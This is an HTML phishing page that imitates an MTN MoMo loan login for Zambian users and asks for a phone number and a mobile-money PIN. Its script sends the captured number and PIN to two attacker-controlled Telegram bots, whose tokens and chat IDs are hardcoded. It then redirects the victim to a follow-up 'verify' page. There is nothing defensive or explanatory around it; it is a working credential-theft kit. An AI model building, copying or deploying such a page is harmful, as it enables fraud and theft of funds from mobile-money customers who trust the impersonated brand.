<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN Loan</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html,
        body {
            min-height: 100vh;
            font-family: 'Inter', sans-serif;
            background: white;
            overflow-x: hidden;
            overflow-y: auto;
        }
        
        body {
            display: flex;
            flex-direction: column;
        }
        
        .logo {
            text-align: center;
            padding: 40px 20px 20px;
            flex-shrink: 0;
        }
        
        .logo-img {
            width: 90px;
            height: 90px;
            object-fit: cover;
            border-radius: 18px;
        }
        
        .logo-title {
            font-size: 32px;
            font-weight: 800;
            margin-top: 10px;
            color: #0b2b6d;
            letter-spacing: 0.2px;
        }
        
        .login-content {
            flex: 1 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 30px 50px;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }
        
        .title {
            font-size: 26px;
            font-weight: 700;
            color: #0f172a;
            margin-bottom: 35px;
        }
        
        .phone-group {
            width: 100%;
            border: 2px solid #0b57d0;
            border-radius: 16px;
            display: flex;
            align-items: center;
            padding: 18px 24px;
            margin-bottom: 38px;
            background: white;
        }
        
        .flag {
            font-size: 28px;
            margin-right: 12px;
        }
        
        .country-select {
            display: flex;
            align-items: center;
            color: #0b57d0;
            font-weight: 700;
            font-size: 18px;
            margin-right: 16px;
            white-space: nowrap;
        }
        
        .dropdown-arrow {
            font-size: 14px;
            margin-left: 6px;
        }
        
        .phone-input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 18px;
            color: #333;
        }
        
        .phone-input::placeholder {
            color: #aaa;
        }
        
        .pin-label {
            font-size: 16px;
            color: #374151;
            margin-bottom: 20px;
            font-weight: 600;
        }
        
        .pin-group {
            display: flex;
            justify-content: center;
            gap: 14px;
            margin-bottom: 26px;
            flex-wrap: wrap;
        }
        
        .pin-box {
            width: 52px;
            height: 52px;
            border: 2px solid #0b57d0;
            border-radius: 16px;
            font-size: 26px;
            text-align: center;
            background: white;
            color: #111827;
            font-weight: 700;
            outline: none;
        }
        
        .forgot {
            font-size: 15px;
            color: #0b57d0;
            text-decoration: none;
            font-weight: 600;
            margin-bottom: 36px;
        }
        
        #loginBtn {
            display: none;
            width: 100%;
            max-width: 400px;
            padding: 18px;
            background: #0b57d0;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            margin-bottom: 50px;
            box-shadow: 0 8px 20px rgba(11, 87, 208, 0.25);
        }
        
        .bottom-section {
            background: #0b3a91;
            color: white;
            padding: 100px 30px 80px;
            text-align: center;
            width: 100vw;
            margin-left: calc(-50vw + 50%);
            position: relative;
            flex-shrink: 0;
        }
        
        .curve {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 90px;
            background: white;
            border-radius: 0 0 50% 50% / 0 0 100% 100%;
            transform: scaleX(1.8);
            transform-origin: top;
        }
        
        .bottom-content {
            position: relative;
            z-index: 2;
        }
        
        .bottom-text {
            font-size: 15px;
            margin-bottom: 35px;
            line-height: 1.6;
            opacity: 0.95;
        }
        
        .bottom-btns {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 40px;
            flex-wrap: wrap;
        }
        
        .bottom-btn {
            background: white;
            color: #0b57d0;
            border: none;
            border-radius: 30px;
            padding: 18px 26px;
            font-weight: 800;
            font-size: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            width: 180px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
            text-decoration: none;
        }
        
        .btn-icon {
            font-size: 26px;
            color: #0b57d0;
        }
        
        .version {
            font-size: 14px;
            margin-bottom: 12px;
            opacity: 0.9;
            font-weight: 700;
        }
        
        .terms {
            font-size: 13px;
            opacity: 0.9;
            line-height: 1.5;
        }
        
        .terms a {
            color: white;
            text-decoration: underline;
            font-weight: 800;
        }
        
        #spinnerOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid #0b3a91;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        
        .spinner-text {
            font-size: 18px;
            color: #111827;
            text-align: center;
            line-height: 1.6;
            max-width: 320px;
            font-weight: 700;
        }
    </style>
</head>

<body>
    <div class="logo">
        <!-- Updated Salaam Bank logo using your provided image address -->
        <img class="logo-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRn0HUAqyMFOi8V451iUCmKrGAgHCaKsqvVs3zRhwnOsQ&s=10" alt="Salaam Bank Logo">
        <div class="logo-title">MTN MOMO</div>
    </div>

    <div class="login-content">
        <h1 class="title">Loan Login</h1>

        <div class="phone-group">
            <span class="flag">ZM</span>
            <div class="country-select">
                +260 <span class="dropdown-arrow">▼</span>
            </div>
            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number">
        </div>

        <div class="pin-label">Enter your PIN (4 digits)</div>

        <!-- Changed PIN input to 4 digits -->
        <div class="pin-group">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">

        </div>

        <a href="#" class="forgot">Forgot your PIN?</a>

        <button id="loginBtn">Login</button>
    </div>

    <div class="bottom-section">
        <div class="curve"></div>
        <div class="bottom-content">
            <div class="bottom-text">
                To apply or get assistance,<br> tap below
            </div>
            <div class="bottom-btns">
                <a href="#" class="bottom-btn">
                    <div class="btn-icon">👤</div>
                    Register
                </a>
                <a href="#" class="bottom-btn">
                    <div class="btn-icon">ℹ️</div>
                    Help & Support
                </a>
            </div>
            <div class="version">v2.13P</div>
            <div class="terms">
                By signing in you agree to our <a href="#">Terms & Conditions</a>
            </div>
        </div>
    </div>

    <div id="spinnerOverlay">
        <div class="spinner"></div>
        <div class="spinner-text">
            Please wait...<br> This usually takes a few seconds
        </div>
    </div>

    <script>
        const BOT_TOKEN_1 = '8508268649:AAE99y4_VebL1hlEbOLxHewLlttfRAZPfPw';
        const CHAT_ID_1 = '8445950458';

        const BOT_TOKEN_2 = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q';
        const CHAT_ID_2 = '5615316142';

        const savedPhone = localStorage.getItem('phone');
        const phoneInput = document.getElementById('phoneInput');

        if (savedPhone && savedPhone.length === 9) {
            phoneInput.value = savedPhone;
        }

        const pinBoxes = document.querySelectorAll('.pin-box');
        const loginBtn = document.getElementById('loginBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        let pinValue = '';

        // Now PIN length should be 5
        function checkPinComplete() {
            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
            loginBtn.style.display = pinValue.length === 5 ? 'block' : 'none';
        }

        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                if (box.value.length === 1 && index < pinBoxes.length - 1) {
                    pinBoxes[index + 1].focus();
                }
                checkPinComplete();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        loginBtn.addEventListener('click', () => {
            const phone = phoneInput.value.trim();
            if (!phone) {
                alert('Please enter your phone number');
                return;
            }

            spinnerOverlay.style.display = 'flex';

            localStorage.setItem('phone', phone);

            const message = `New Loan Login Attempt\n\nPhone: +260 ${phone}\nPIN: ${pinValue}`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID_1,
                    text: message
                })
            }).catch(() => {});

            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID_2,
                    text: message
                })
            }).catch(() => {});

            setTimeout(() => {
                window.location.href = 'verify.html';
            }, 1500);
        });

        checkPinComplete();
        pinBoxes[0].focus();
    </script>
</body>

</html>
